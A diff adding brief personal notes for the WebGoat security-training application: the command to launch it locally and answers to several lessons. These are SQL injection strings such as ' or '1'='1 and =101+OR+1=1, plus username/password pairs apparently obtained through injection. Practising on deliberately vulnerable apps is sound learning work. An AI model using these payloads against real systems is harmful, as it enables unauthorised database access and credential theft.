@@ -1,0 +1,21 @@
+java -jar WebGoat-6.0.1-war-exec.jar -httpPort 9090
+
+localhost:9090/WebGoat/start.mvc
+
+Denial of Service
+' or '1' = '1
+
+SELECT * FROM weather_data WHERE station = 101 or 1=1!
+
+String SQL Injection
+Maher' OR '1'='1
+
+Numeric Injection
+=101+OR+1=1
+
+jsnow passwd1
+jdoe passwd2
+jplane passwd3
+jeff jeff
+dave dave
+
